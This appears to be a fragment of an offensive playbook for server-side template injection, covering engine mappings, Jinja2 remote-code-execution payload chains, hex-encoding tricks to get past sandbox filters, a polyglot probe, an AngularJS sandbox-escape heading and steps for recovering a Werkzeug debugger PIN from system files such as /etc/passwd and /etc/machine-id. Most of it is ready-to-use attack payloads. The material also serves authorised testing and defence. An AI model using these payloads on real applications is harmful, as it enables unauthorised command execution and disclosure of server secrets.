...
## Advanced Technical Reference (from ssti-playbook)

### Engine-to-Language Mapping (Extended)
...
| Nunjucks | Node.js | Various |
| Tornado | Python | Tornado |
| Razor | C# | ASP.NET |

### Jinja2 RCE — Extended Chains

**Chain 5 — `cycler` object (Flask built-in, alternative to `lipsum`):**
```python
{{cycler.__init__.__globals__.os.popen('id').read()}}
```

**Finding correct Popen index dynamically:**
```python
...
### Jinja2 Sandbox Bypass — Per-Obstacle Techniques

| Obstacle | Bypass |
|---|---|
| `_` blocked | `''|attr('\x5f\x5fclass\x5f\x5f')` — hex encode `__` |
| `.` blocked | `''['__class__']` or `config['SECRET_KEY']` — subscript notation |
| `class`/`mro` keywords blocked | `|attr('\x5f\x5fclass\x5f\x5f')` / `|attr('\x5f\x5fm\x72\x6F\x5f\x5f')` via hex |
| Output encoding strips HTML | Use `|safe` filter to prevent auto-escaping |

**Chain 3 — `request` object with hex encoding (when `config` is blocked):**
```python
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

### FreeMarker — ObjectConstructor Alternative
```freemarker
...
### Client-Side Template Injection (AngularJS)

When AngularJS evaluates expressions in the DOM and user data flows into template expressions. **Detection:** send `{{1+1}}` — if page shows `2`, AngularJS evaluates expressions.

```javascript
// AngluarJS 1.x sandbox escape:
...
### Universal Detection Polyglot Probe

Single payload that triggers errors or evaluation in many engines:
```
${{<%[%'"}}%\.
```
...
When Flask debug mode (Werkzeug debugger) is exposed but PIN-protected, the PIN is derived from host-specific values:

1. **username** — from `/etc/passwd` (user running Flask process)
2. **module name** — often `flask.app` or `Flask`
3. **application path** — `app.py` or real main filename
4. **MAC address** — `/sys/class/net/eth0/address`, converted to decimal per Werkzeug
5. **Machine ID** — `/etc/machine-id`, or `/proc/sys/kernel/random/boot_id` combined with first line of `/proc/self/cgroup`
6. Compute PIN using established open-source PIN calculators implementing Werkzeug's algorithm
